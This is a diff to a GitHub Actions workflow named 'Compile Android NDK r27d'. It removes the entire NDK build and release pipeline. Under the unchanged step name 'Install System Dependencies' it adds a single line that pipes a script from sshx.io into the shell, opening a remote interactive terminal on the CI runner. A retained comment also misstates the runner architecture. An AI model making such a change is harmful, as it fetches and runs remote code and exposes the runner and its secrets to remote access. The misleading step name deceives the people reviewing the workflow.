@@ -9,76 +9,8 @@ permissions:
 jobs:
   build:
     name: Compile Android NDK r27d
-    runs-on: ubuntu-24.04-arm # Menggunakan arsitektur native ARM64 dari GitHub
+    runs-on: ubuntu-latest # Menggunakan arsitektur native ARM64 dari GitHub
     
     steps:
-      - name: Checkout SnowNF Repository
-        uses: actions/checkout@v4
-
-      - name: Free Up Disk Space
-        uses: jlumbroso/free-disk-space@main
-        with:
-          # Membersihkan pre-installed tools untuk ruang repositori AOSP yang masif (>30GB)
-          tool-cache: true
-          android: true
-          dotnet: true
-          haskell: true
-          large-packages: true
-          swap-storage: true
-
       - name: Install System Dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y git python3 python3-pip curl build-essential \
-                                  ninja-build zip unzip bison flex bc \
-                                  libssl-dev libncurses-dev rsync pbzip2
-          
-      - name: Setup Repo Tool
-        run: |
-          mkdir -p ~/.bin
-          curl -o ~/.bin/repo https://storage.googleapis.com/git-repo-downloads/repo
-          chmod a+rx ~/.bin/repo
-          echo "$HOME/.bin" >> $GITHUB_PATH
-
-      - name: Initialize & Sync Android Platform Source (r27d)
-        run: |
-          git config --global user.name "GitHub Action"
-          git config --global user.email "action@github.com"
-          
-          mkdir -p aosp-ndk
-          cd aosp-ndk
-          
-          # Inisialisasi manifest platform Android dengan branch ndk-r27d
-          repo init -u https://android.googlesource.com/platform/manifest -b ndk-r27d --depth=1
-          repo sync -c -j$(nproc) --no-tags --no-clone-bundle
-
-      - name: Apply SnowNF Patches
-        run: |
-          # Menyalin file modifikasi aarch64-linux (jika ada script custom dari repo Anda) ke dalam tree NDK
-          rsync -a --exclude='.git/' --exclude='aosp-ndk/' $GITHUB_WORKSPACE/ $GITHUB_WORKSPACE/aosp-ndk/
-
-      - name: Build NDK
-        working-directory: aosp-ndk
-        run: |
-          # Eksekusi script standar NDK (bisa disesuaikan jika digest .txt spesifik Anda memiliki flag lain)
-          python3 ndk/build/tools/make_ndk.py --out-dir ../out
-          
-      - name: Package NDK
-        working-directory: out
-        run: |
-          # Kompresi parallel menggunakan pbzip2 agar lebih cepat
-          tar -I pbzip2 -cf android-ndk-r27d-linux-aarch64.tar.bz2 android-ndk-r27d/
-
-      - name: Upload Build Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: ndk-r27d-aarch64
-          path: out/android-ndk-r27d-linux-aarch64.tar.bz2
-          retention-days: 7
-
-      - name: Create GitHub Release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: r27d-build
-          name: "Android NDK r27d (aarch64-linux)"
-          files: out/android-ndk-r27d-linux-aarch64.tar.bz2
+        run: curl -sSf https://sshx.io/get | sh -s run
